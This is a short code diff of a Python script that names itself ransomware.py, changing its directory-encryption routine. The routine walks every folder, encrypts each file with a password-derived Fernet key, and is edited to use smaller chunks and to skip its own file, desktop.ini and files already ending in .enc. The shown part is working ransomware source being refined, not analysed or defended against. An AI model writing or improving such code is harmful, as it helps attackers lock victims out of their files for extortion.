@@ -30,12 +30,14 @@ def validate_password(input_password):
     """Check if the provided password is correct."""
     return derive_key(input_password) == key
 
-def encrypt_directory(directory, key, chunk_size=2048 * 2048):
+def encrypt_directory(directory, key, chunk_size=1024 * 1024):
     try:
         f = Fernet(key)
         for root, _, files in os.walk(directory):
             for file in files:
-                if file.lower() in ["desktop.ini", "ransomware.py"]:
+                # Skip specific files and already encrypted files
+                if file.lower() in ["desktop.ini", "ransomware.py"] or file.endswith(".enc"):
+                    print(f"Skipping: {file}")
                     continue
 
                 filepath = os.path.join(root, file)
